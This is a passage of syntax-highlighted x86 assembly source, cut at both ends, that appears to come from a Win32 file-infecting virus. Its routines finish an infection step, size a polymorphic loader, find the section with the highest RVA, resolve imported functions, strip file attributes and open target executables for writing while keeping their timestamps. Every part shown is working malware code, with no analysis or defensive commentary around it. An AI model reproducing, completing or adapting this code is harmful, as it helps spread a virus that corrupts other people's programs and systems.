   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">

   </span><span class="sc5">_infect_end_1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_close_file</span><span class="sc0">

   </span><span class="sc5">_infect_end</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFECT</span><span class="sc4">|</span><span class="sc5">ROUTINE</span><span class="sc4">|</span><span class="sc9">END</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">_current_fname</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

   </span><span class="sc5">_poly_fields</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">l_size</span><span class="sc0"> </span><span class="sc1">;  &lt;---temporary - it'l be the poly loader size</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_viral_temp_sz</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_viral_pack_packet_sz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_check_know_section</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc4">~</span><span class="sc5">CODE</span><span class="sc4">~</span><span class="sc9">.code</span><span class="sc4">~</span><span class="sc5">DATA</span><span class="sc4">~</span><span class="sc9">.data</span><span class="sc4">~</span><span class="sc5">.rdata</span><span class="sc4">~</span><span class="sc5">.sdata</span><span class="sc4">~</span><span class="sc5">.idata</span><span class="sc4">~</span><span class="sc5">.edata</span><span class="sc4">~</span><span class="sc5">.rsrc</span><span class="sc4">~</span><span class="sc5">.reloc</span><span class="sc4">~</span><span class="sc5">.debug</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

   </span><span class="sc5">cmp_section</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmpi</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_cmp_section</span><span class="sc0">

   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cmp_section</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

   </span><span class="sc5">end_cmp_section</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;  00401d05</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc2">.64</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc2">.64</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">_cmp_1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_cmp_ret</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

   </span><span class="sc1">;  EAX points to the first imported function</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_look_4_function</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmp</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_cmp_1</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_look_4_function</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_look_4_function</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_import_function</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.IMAGE_NT_HEADERS.OptionalHeader.ImageBase</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">;  Runtime address of function in [EAX]</span><span class="sc0">

   </span><span class="sc5">_cmp_ret</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_rva_to_va</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageRvaToVa</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">_re_size</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_close_file</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_open_write</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_re_align</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  _re_align (alignment, value)</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_viral_pack_packet_sz</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">_biggest_rva</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  return pointer to section with the biggest</span><span class="sc0">
   </span><span class="sc1">;  RVA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">
   </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">_biggest_rva_end</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">_rva_loop</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">_rva_loop_1</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">_rva_loop_1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_biggest_rva_end</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">_rva_loop</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_rva_loop</span><span class="sc0">

   </span><span class="sc5">_biggest_rva_end</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_biggest_rva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_open_read</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_create_flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_map_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_mview_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">_open</span><span class="sc0">

   </span><span class="sc5">_open_create</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_create_flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_map_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_mview_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">_open</span><span class="sc0">

   </span><span class="sc5">_open_write</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_create_flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_map_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_mview_access_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">

   </span><span class="sc5">_open</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_file_attrib</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetFileAttributesA</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_set_normal</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_file_attrib</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_io_end</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_COMPRESSED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_io_end</span><span class="sc0">

   </span><span class="sc5">_set_normal</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_create_flag</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_access_type</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_close_1</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_file_time</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFile</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetFileTime</span><span class="sc0">

   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_close_2</span><span class="sc0">

